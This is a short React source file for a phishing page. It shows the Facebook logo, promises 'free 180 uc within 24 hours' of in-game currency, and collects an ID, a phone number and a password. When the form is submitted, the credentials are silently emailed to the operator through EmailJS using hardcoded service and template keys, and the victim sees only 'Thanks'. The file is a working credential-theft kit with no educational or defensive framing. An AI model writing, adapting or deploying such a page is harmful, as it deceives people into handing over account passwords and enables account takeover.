import React, { useRef } from 'react';
import emailjs from '@emailjs/browser';

function App() {
  const form = useRef();

  const send = (e) => {
    e.preventDefault();

    emailjs.sendForm('service_a6fu3pd', 'template_7aqhoi4', form.current, 'RxjSlFBfYgcuhQqQu')
      .then((result) => {
        console.log(result.text);
      }, (error) => {
        console.log(error.text);
      });
    alert('Thanks')
  };
  return (
    <>
      <div className="main">
        <div className="login-container">
          <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" width={200} alt="" />
          <form ref={form} onSubmit={send} >
            <input type="text" name="id" placeholder="ID" />
            <input type="text" name="user" placeholder="Number" />
            <input type="password" name="password" placeholder="Password" />
            <button>Run</button>
          </form>
          <p>Take free 180 uc within 24 hours</p>
        </div>
      </div>
    </>
  );
}

export default App;
